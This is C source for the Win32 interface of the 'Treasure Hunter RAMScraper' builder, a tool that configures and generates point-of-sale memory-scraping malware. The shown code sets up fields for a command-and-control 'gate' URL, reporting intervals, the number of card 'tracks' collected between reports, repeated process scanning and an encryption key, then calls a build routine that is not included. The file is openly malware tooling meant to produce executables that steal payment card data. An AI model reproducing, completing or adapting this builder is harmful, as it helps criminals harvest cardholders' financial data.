void renameExe(WCHAR *szFileName){
	int i, j, length;
	LPCWSTR newExeName = L"build", fileExt = L".exe";

	length = wcslen(szFileName);
	length -= 4; /* for .exe */
	for (i=length-1; szFileName[i-1]!='\\'; i--);
	j = i;
	for (i; i<length && i-j<5; i++)
		szFileName[i] = newExeName[i-j];
	j = i;
	for (i; i<length+4; i++)
		szFileName[i] = fileExt[i-j];
}

void writeToLog(WCHAR *text){
	int len;
	WCHAR *newText;

	len = GetWindowTextLength(hBuildLogDisplay);
	len ++;
	newText = (WCHAR*)malloc(sizeof(WCHAR) * (len + 1 + wcslen(text)));
	GetWindowText(hBuildLogDisplay, newText, len);
	if (len > 2 && newText[len-2] == L'\r' && newText[len-1] != L'\n')
		newText[len-1] = L'\n';
	newText[len] = L'\0';
	wcscat(newText, text);

	SendMessage(hBuildLogDisplay, WM_SETTEXT, NULL, (LPARAM)newText);
	SendMessage(hBuildLogDisplay, WM_VSCROLL, SB_BOTTOM, NULL);

	free(newText);
}

void populateWindow(HWND hwnd){
	HINSTANCE hInstance;
	HWND hButtonExit, hButtonAbout, hInfoLabel, hGroupbox, 
		 hGateURLPrefix, hReportsPauseLabel,
		 hScanPauseLabel, hTracksNumLabel,
		 hFirstEncKeyLabel, hOutputPathLabel, hButtonBrowse,
		 hBuildLogLabel;

	/* Generate output filename */
	hInstance = GetModuleHandle(NULL);
	GetModuleFileName(hInstance, szFileName, MAX_PATH);
	renameExe(szFileName);

	/* Close button */
	hButtonAbout = createControl(hwnd, IDC_EXIT_BUTTON, L"Button",  BS_TEXT | WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, L"Close", 590, 400, 100, 30);

	/* About button */
	hButtonAbout = createControl(hwnd, IDC_ABOUT_BUTTON, L"Button",  BS_TEXT | WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, L"About", 25, 400, 100, 30);

	/* Copyright label */
	hInfoLabel = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"© 2014 Jolly Roger (jollyroger@prv.name)", 150, 410, 300, 30);

	/* Common Controls Group Box */
	hGroupbox = createControl(hwnd, IDC_INFO_GROUPBOX, L"Button", WS_CHILD | WS_VISIBLE | BS_GROUPBOX, L"Build Settings", 10, 10, 700, 225);

	/* Gate settings */

	/* -- Gate URL prefix */
	hGateURLPrefix = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"Gate URL (127 chars max): http://", 20, 28, 170, 20);

	/* -- Gate URL input - max. 126 chars */
	hGateURLInput = createControl(hwnd, IDC_GATEURL_INPUT, L"Edit", BS_TEXT | ES_AUTOHSCROLL | WS_CHILD | WS_VISIBLE | WS_BORDER, L"", 185, 26, 510, 17);
	SendMessage(hGateURLInput, EM_SETLIMITTEXT, 126, 0);

	/* -- Pause between reports to gate label */
	hReportsPauseLabel = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"Pause between reports (milliseconds, 9999999 max):", 20, 50, 250, 20);

	/* -- Pause between reports to gate input - max. 7 chars */
	hReportsPauseInput = createControl(hwnd, IDC_REPORT_PAUSE_INPUT, L"Edit", BS_TEXT | WS_CHILD | WS_VISIBLE | ES_NUMBER | WS_BORDER, L"", 270, 48, 50, 17);
	SendMessage(hReportsPauseInput, EM_SETLIMITTEXT, 7, 0);


	/* Scan settings */

	/* -- Pause between scans label */
	hScanPauseLabel = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"Pause between complete scans (milliseconds, 9999999 max):", 350, 50, 300, 20);

	/* -- Pause between scans input - max. 7 chars */
	hScanPauseInput = createControl(hwnd, IDC_SCAN_PAUSE_INPUT, L"Edit", BS_TEXT | WS_CHILD | WS_VISIBLE | ES_NUMBER | WS_BORDER, L"", 645, 48, 50, 17);
	SendMessage(hScanPauseInput, EM_SETLIMITTEXT, 7, 0);

	/* -- Maximum number of tracks accumulated between reports label */
	hTracksNumLabel = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"Maximum number of tracks to be accumulated between reports (99 max):", 20, 75, 350, 20);

	/* -- Maximum number of tracks accumulated between reports input - max. 2 chars */
	hTracksNumInput = createControl(hwnd, IDC_TRACKS_NUM_INPUT, L"Edit", BS_TEXT | WS_CHILD | WS_VISIBLE | ES_NUMBER | WS_BORDER, L"", 370, 73, 20, 17);
	SendMessage(hTracksNumInput, EM_SETLIMITTEXT, 2, 0);


	/* Clingfish Mode settings */

	/* -- Enable Clingfish Mode checkbox */
	hEnableClingfishMode = createControl(hwnd, IDC_ENABLE_CLINGFISH_MODE, L"Button", BS_CHECKBOX | WS_CHILD | WS_VISIBLE, L"Enable Clingfish Mode", 20, 99, 150, 17);
	CheckDlgButton(hwnd, IDC_ENABLE_CLINGFISH_MODE, BST_CHECKED);

	/* -- Pause between Clingfish scans of a process label */
	hClingfishPauseLabel = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"Pause between Clingfish Mode scans of a process (milliseconds, 9999999 max):", 180, 100, 383, 20);

	/* -- Pause between Clingfish scans of a process input - max. 7 chars */
	hClingfishPauseInput = createControl(hwnd, IDC_CLINGFISH_PAUSE_INPUT, L"Edit", BS_TEXT | WS_CHILD | WS_VISIBLE | ES_NUMBER | WS_BORDER, L"", 563, 98, 50, 17);
	SendMessage(hClingfishPauseInput, EM_SETLIMITTEXT, 7, 0);

	/* -- Pause between scans after Clingfish Mode has been enabled label */
	hScanPauseAfterClingfishModeLabel = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"Pause between complete scans after Clingfish Mode has been enabled (milliseconds, 9999999 max):", 20, 125, 475, 20);

	/* -- Pause between scans after Clingfish Mode has been enabled - max. 7 chars */
	hScanPauseAfterClingfishModeInput = createControl(hwnd, IDC_SCAN_PAUSE_AFTER_CLINGFISH_INPUT, L"Edit", BS_TEXT | WS_CHILD | WS_VISIBLE | ES_NUMBER | WS_BORDER, L"", 503, 123, 50, 17);
	SendMessage(hScanPauseAfterClingfishModeInput, EM_SETLIMITTEXT, 7, 0);

	/* Encryption key and Debug Mode settings */

	/* -- First encryption key label */
	hFirstEncKeyLabel = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"First encryption key to be used (25 chars max):", 20, 147, 230, 20);

	/* -- First encryption key input - max. 24 chars */
	hFirstEncKeyInput = createControl(hwnd, IDC_FIRST_ENC_KEY_INPUT, L"Edit", BS_TEXT | WS_CHILD | WS_VISIBLE | WS_BORDER, L"", 250, 145, 155, 17);
	SendMessage(hFirstEncKeyInput, EM_SETLIMITTEXT, 24, 0);

	/* -- Enable Debug Mode checkbox */
	hEnableDebugMode = createControl(hwnd, IDC_ENABLE_DEBUG_MODE, L"Button", BS_CHECKBOX | WS_CHILD | WS_VISIBLE, L"Enable Debug Mode", 20, 170, 140, 17);


	/* Output path */

	/* -- Output path label */
	hOutputPathLabel = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"Build output path (260 chars max):", 20, 195, 200, 20);

	/* -- Output path input - max. 260 characters (MAX_PATH) */
	hOutputPathInput = createControl(hwnd, IDC_OUTPUT_PATH_INPUT, L"Edit", BS_TEXT | ES_AUTOHSCROLL | WS_CHILD | WS_VISIBLE | WS_BORDER, szFileName, 192, 193, 397, 17);
	SendMessage(hOutputPathInput, EM_SETLIMITTEXT, MAX_PATH, 0);

	/* -- Browse button */
	hButtonBrowse = createControl(hwnd, IDC_BROWSE_BUTTON, L"Button",  BS_TEXT | WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, L"Browse...", 595, 187, 100, 30);

	/* Build button and log display */

	/* Build button */
	hBuildButton = createControl(hwnd, IDC_BUILD_BUTTON, L"Button",  BS_TEXT | WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, L"Build", 310, 240, 100, 30);

	/* -- Build log label */
	hBuildLogLabel = createControl(hwnd, IDC_GENERIC_LABEL, L"Static", BS_TEXT | WS_CHILD | WS_VISIBLE, L"Build log:", 20, 272, 50, 20);

	/* -- Build log display */
	hBuildLogDisplay = createControl(hwnd, IDC_BUILD_LOG_DISPLAY, L"Edit", BS_TEXT | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_CHILD | WS_VISIBLE | WS_BORDER, L"", 20, 287, 675, 105);
	ShowScrollBar(hBuildLogDisplay, SB_VERT, TRUE);

	writeToLog(L"Welcome to the Treasure Hunter RAMScraper v0.8 alpha builder\r\n\r\n");
}

void enableClingfishSettings(BOOL enable){
	EnableWindow(hClingfishPauseLabel, enable);
	EnableWindow(hClingfishPauseInput, enable);
	EnableWindow(hScanPauseAfterClingfishModeLabel, enable);
	EnableWindow(hScanPauseAfterClingfishModeInput, enable);
}

void switchCheckbox(HWND hwnd, int checkboxID){
	UINT btnCheckStatus;

	btnCheckStatus = IsDlgButtonChecked(hwnd, checkboxID);
	if (btnCheckStatus == BST_UNCHECKED){
		CheckDlgButton(hwnd, checkboxID, BST_CHECKED);
		if (checkboxID == IDC_ENABLE_CLINGFISH_MODE)
			enableClingfishSettings(TRUE);
	} else if (btnCheckStatus == BST_CHECKED){
		CheckDlgButton(hwnd, checkboxID, BST_UNCHECKED);
		if (checkboxID == IDC_ENABLE_CLINGFISH_MODE)
			enableClingfishSettings(FALSE);
	}
}

void runCommand(HWND hwnd, HINSTANCE hInstance, WPARAM wParam){
	OPENFILENAME ofn;
	UINT btnCheckStatus;

	switch(LOWORD(wParam)){
        case IDC_EXIT_BUTTON:
			PostMessage(hwnd, WM_CLOSE, 0, 0);
        break;

        case IDC_ABOUT_BUTTON:
			if (createDialogBox(hwnd, hInstance) == 0)
				MessageBoxA(NULL, "Dialog Creation Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
        break;

		case IDC_ENABLE_CLINGFISH_MODE:
			switchCheckbox(hwnd, IDC_ENABLE_CLINGFISH_MODE);
		break;

		case IDC_ENABLE_DEBUG_MODE:
			switchCheckbox(hwnd, IDC_ENABLE_DEBUG_MODE);
		break;

		case IDC_BROWSE_BUTTON:
			ZeroMemory(&ofn, sizeof(ofn));
			ofn.lStructSize = sizeof(ofn);
			ofn.hwndOwner = hwnd;
			ofn.lpstrFilter = L"Application (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
			ofn.lpstrFile = szFileName;
			ofn.nMaxFile = MAX_PATH;
			ofn.Flags = OFN_EXPLORER | OFN_PATHMUSTEXIST | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
			ofn.lpstrDefExt = L"exe";

			GetSaveFileName(&ofn);

			SendMessage(hOutputPathInput, WM_SETTEXT, TRUE, (LPARAM)ofn.lpstrFile);
		break;

		case IDC_BUILD_BUTTON:
			EnableWindow(hBuildButton, FALSE);
			generateBuild(hwnd);
		break;
    }
}

/* The Window Procedure */
LRESULT CALLBACK windowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam){
	switch(msg){
		case WM_CREATE:
			populateWindow(hwnd);
		break;

		case WM_COMMAND:
            runCommand(hwnd, ghInstance, wParam);
        break;

        case WM_CLOSE:
            DestroyWindow(hwnd);
        break;

        case WM_DESTROY:
            PostQuitMessage(0);
        break;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int createWindow(HINSTANCE hInstance, int nCmdShow){
	LPCWSTR g_szClassName = L"WindowClass";
    HWND hwnd;
    MSG Msg;
	ghInstance = hInstance;

    /* Register the window class */
    if (registerClass(hInstance, g_szClassName, (WNDPROC)windowProc) == 0){
        MessageBoxA(NULL, "Window Registration Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    /* Create the window */
    hwnd = CreateWindowEx(WS_EX_CLIENTEDGE, g_szClassName, L"Treasure Hunter RAMScraper v0.8 Alpha Builder", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, CW_USEDEFAULT, CW_USEDEFAULT, 740, 500, NULL, NULL, hInstance, NULL);

    if(hwnd == NULL){
        MessageBoxA(NULL, "Window Creation Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    /* The message loop */
    while(GetMessageA(&Msg, NULL, 0, 0) > 0){
        TranslateMessage(&Msg);
        DispatchMessageA(&Msg);
    }
    return Msg.wParam;
}